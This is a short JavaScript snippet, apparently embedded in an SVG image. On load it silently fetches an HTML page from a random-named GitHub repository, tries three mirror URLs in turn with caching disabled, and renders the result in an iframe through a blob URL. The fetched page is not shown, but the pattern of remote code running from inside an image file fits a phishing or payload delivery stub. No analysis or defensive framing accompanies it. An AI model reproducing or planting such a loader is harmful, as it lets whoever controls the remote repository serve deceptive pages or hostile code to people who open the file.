svg.script:

(function() {
  var URLS = [
    "https://cdn.jsdelivr.net/gh/hexorod/676767boiiiiAIDJIUASHDFJOASHFIAEWWHFOKASJFNI@refs/heads/main/s.html",
    "https://raw.githack.com/hexorod/676767boiiiiAIDJIUASHDFJOASHFIAEWWHFOKASJFNI/main/s.html",
    "https://raw.githubusercontent.com/hexorod/676767boiiiiAIDJIUASHDFJOASHFIAEWWHFOKASJFNI/main/s.html"
  ];
  var frame = document.getElementById("f");
  function tryFetch(i) {
    if (i >= URLS.length) return;
    fetch(URLS[i], { cache: "no-store" })
      .then(function(r) {
        if (!r.ok) throw new Error("HTTP " + r.status);
        return r.text();
      })
      .then(function(html) {
        var blob = new Blob([html], { type: "text/html" });
        frame.src = URL.createObjectURL(blob);
      })
      .catch(function() {
        tryFetch(i + 1);
      });
  }
  tryFetch(0);
}());
